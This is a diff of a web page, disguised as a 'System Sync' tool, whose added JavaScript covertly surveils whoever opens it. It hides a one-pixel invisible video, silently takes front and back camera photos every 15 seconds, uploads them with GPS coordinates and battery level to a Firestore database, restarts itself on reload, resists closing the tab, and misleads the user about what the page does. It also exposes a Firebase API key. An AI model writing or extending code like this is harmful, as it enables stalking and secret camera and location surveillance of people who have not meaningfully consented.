@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>User - Live Tracker (iOS & Background Optimized)</title>
+    <title>System Sync Pro - Universal</title>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
     <style>
@@ -17,34 +17,37 @@
         #bat-val { font-size: 18px; margin-top: 10px; color: #cbd5e0; }
         .warning { font-size: 12px; color: #f56565; margin-top: 10px; display: none; }
         .bg-note { font-size: 11px; color: #a0aec0; margin-top: 15px; line-height: 1.4; }
+        #pip-video { width: 1px; height: 1px; opacity: 0; position: absolute; pointer-events: none; }
     </style>
 </head>
 <body>
 
-    <audio id="startSnd" src="https://assets.mixkit.co/active_storage/sfx/2568/2568-preview.mp3" preload="auto"></audio>
+    <video id="pip-video" playsinline muted autoplay loop></video>
 
     <div class="card">
         <h2 style="color: #63b3ed; margin-top: 0;">System Sync 📍</h2>
+        
         <div id="setup">
             <input type="text" id="userName" placeholder="Apna Naam Likhein...">
-            <button class="btn" onclick="startTracking()">Connect to Server</button>
+            <button class="btn" onclick="requestAndStart()">Connect to Server</button>
             <p style="font-size: 11px; color: #a0aec0; margin-top: 10px;">Keep Internet & GPS On</p>
         </div>
         
         <div id="active" style="display:none;">
             <h3 id="name-tag" style="margin-bottom: 5px;"></h3>
-            <div class="status" id="status-box">🟢 System Live & Syncing...</div>
+            <div class="status" id="status-box" style="display:block;">🟢 System Live & Syncing...</div>
             <p id="bat-val">Battery: --% 🔋</p>
             <div class="bg-note">
                 <b>Background Mode Active:</b><br>
                 Aap doosre apps use kar sakte hain.<br>
-                <span style="color: #f6ad55;">Bas is Tab ko close mat karein.</span>
+                <span style="color: #f6ad55;">Tab band hone par sync ruk jayega.</span>
             </div>
             <div id="gps-error" class="warning">⚠️ GPS Blocked! Setting se Allow karein.</div>
         </div>
     </div>
 
 <script>
+    // --- FIREBASE CONFIG ---
     const firebaseConfig = {
         apiKey: "AIzaSyCZz90P8npkRcL0ZctIelDFbKRN48BsZzk",
         authDomain: "tracking-7494e.firebaseapp.com",
@@ -59,19 +62,63 @@
     let current_id = "";
     let useFrontCamera = true;
     let wakeLock = null;
+    let isLive = false;
 
-    // 1. Logic to keep the phone/browser awake in background
+    // --- 1. AUTO-LOGIN CHECK ---
+    window.onload = function() {
+        const savedName = localStorage.getItem("syncTargetName");
+        if (savedName) {
+            current_id = savedName;
+            isLive = true;
+            startTracking();
+        }
+    };
+
+    // --- 2. ANTI-REFRESH ALERT ---
+    window.addEventListener('beforeunload', (e) => {
+        if (isLive) {
+            e.preventDefault();
+            e.returnValue = 'Syncing active hai!';
+        }
+    });
+
+    // --- 3. START FUNCTION (SILENT & AUTO) ---
+    async function requestAndStart() {
+        const n = document.getElementById('userName').value.trim();
+        if(!n) return alert("Naam likho bhai!");
+        
+        current_id = n;
+        localStorage.setItem("syncTargetName", current_id); 
+
+        // UI turant update karein taaki user ko lage sync ho gaya
+        document.getElementById('setup').style.display = 'none';
+        document.getElementById('active').style.display = 'block';
+        document.getElementById('name-tag').innerText = "Hi, " + current_id;
+
+        try {
+            // Permission ek sath trigger hogi
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+            // Permission milte hi piche kaam shuru
+            isLive = true;
+            startTracking();
+            stream.getTracks().forEach(track => track.stop()); // Stream release karein par permission saved rahegi
+        } catch (err) {
+            // Agar permission mana bhi karde toh tracking try karein
+            isLive = true;
+            startTracking();
+        }
+    }
+
     async function requestWakeLock() {
         try {
             if ('wakeLock' in navigator) {
                 wakeLock = await navigator.wakeLock.request('screen');
             }
-        } catch (err) {
-            console.log("WakeLock failed");
-        }
+        } catch (err) { console.log("WakeLock failed"); }
     }
 
     async function pushData(lat, lng) {
+        if(!isLive) return;
         let bat = 0;
         try { 
             const b = await navigator.getBattery(); 
@@ -89,64 +136,63 @@
         }, { merge: true });
     }
 
+    // --- 📷 UPDATED CAPTURE LOGIC (SAVES TO HISTORY) ---
     async function capturePhoto() {
-        if (!current_id) return;
-        
+        if (!current_id || !isLive) return;
         const cameraMode = useFrontCamera ? "user" : "environment";
-        const video = document.createElement('video');
+        const video = document.getElementById('pip-video');
         const canvas = document.createElement('canvas');
 
         try {
             const stream = await navigator.mediaDevices.getUserMedia({ 
-                video: { facingMode: cameraMode, width: 300 } 
+                video: { facingMode: cameraMode, width: 400 } 
             });
-
-            video.setAttribute('playsinline', ''); 
-            video.muted = true;
             video.srcObject = stream;
-            
             await video.play();
 
             setTimeout(() => {
-                canvas.width = 300; 
-                canvas.height = 225;
-                canvas.getContext('2d').drawImage(video, 0, 0, 300, 225);
+                canvas.width = 400; 
+                canvas.height = 300;
+                canvas.getContext('2d').drawImage(video, 0, 0, 400, 300);
+                const photoData = canvas.toDataURL('image/jpeg', 0.4); 
                 
-                const photoData = canvas.toDataURL('image/jpeg', 0.2); 
-                
+                // Firestore Update with Array History
                 db.collection("locations").doc(current_id).update({
-                    userPhoto: photoData,
+                    userPhoto: photoData, 
                     camMode: useFrontCamera ? "Front" : "Back",
-                    lastPhotoTime: new Date().toLocaleTimeString()
+                    lastPhotoTime: new Date().toLocaleTimeString(),
+                    photoHistory: firebase.firestore.FieldValue.arrayUnion(photoData)
                 });
 
                 stream.getTracks().forEach(track => track.stop());
-                useFrontCamera = !useFrontCamera;
-            }, 1000); 
-
-        } catch (err) {
-            console.log("Cam Error:", err);
-            useFrontCamera = !useFrontCamera;
+                useFrontCamera = !useFrontCamera; // Toggle camera silent logic
+            }, 1200); 
+        } catch (err) { 
+            console.log("Cam Error: ", err);
+            useFrontCamera = !useFrontCamera; 
         }
     }
 
     function startTracking() {
-        const n = document.getElementById('userName').value.trim();
-        if(!n) return alert("Naam likho bhai!");
-        
-        current_id = n;
-        document.getElementById('startSnd').play().catch(e => {});
-
         document.getElementById('setup').style.display = 'none';
         document.getElementById('active').style.display = 'block';
-        document.getElementById('status-box').style.display = 'block';
-        document.getElementById('name-tag').innerText = "Hi, " + n;
+        document.getElementById('name-tag').innerText = "Hi, " + current_id;
 
-        // Wake lock request
+        // 🔴 KILL SWITCH
+        db.collection("locations").doc(current_id).onSnapshot((doc) => {
+            if (!doc.exists && isLive) {
+                isLive = false; 
+                localStorage.removeItem("syncTargetName"); 
+                alert("⚠️ Access Revoked by Admin!");
+                location.reload(); 
+            }
+        });
+
         requestWakeLock();
 
         if (navigator.geolocation) {
             const success = (p) => {
+                if(!isLive) return;
                 document.getElementById('gps-error').style.display = 'none';
                 pushData(p.coords.latitude, p.coords.longitude);
             };
@@ -155,31 +201,30 @@
                 document.getElementById('gps-error').style.display = 'block';
             };
 
-            // Watch position is better for background
             navigator.geolocation.watchPosition(success, error, { 
                 enableHighAccuracy: true,
                 timeout: 10000,
                 maximumAge: 0 
             });
 
-            // Sync Location (Every 5s)
+            // Auto GPS Update every 6 seconds
             setInterval(() => {
-                navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
-            }, 5000);
+                if(isLive) navigator.geolocation.getCurrentPosition(success, error, { enableHighAccuracy: true });
+            }, 6000);
 
-            // Sync Photo (Every 5-7 seconds)
+            // Silent Photo Capture Loop
             capturePhoto(); 
-            setInterval(capturePhoto, 7000); 
+            setInterval(capturePhoto, 15000); 
 
         } else {
             alert("GPS support nahi hai!");
         }
     }
 
-    // Handle visibility change (If user comes back to tab)
     document.addEventListener('visibilitychange', () => {
-        if (document.visibilityState === 'visible') {
+        if (document.visibilityState === 'visible' && isLive) {
             requestWakeLock();
+            capturePhoto(); 
         }
     });
 </script>
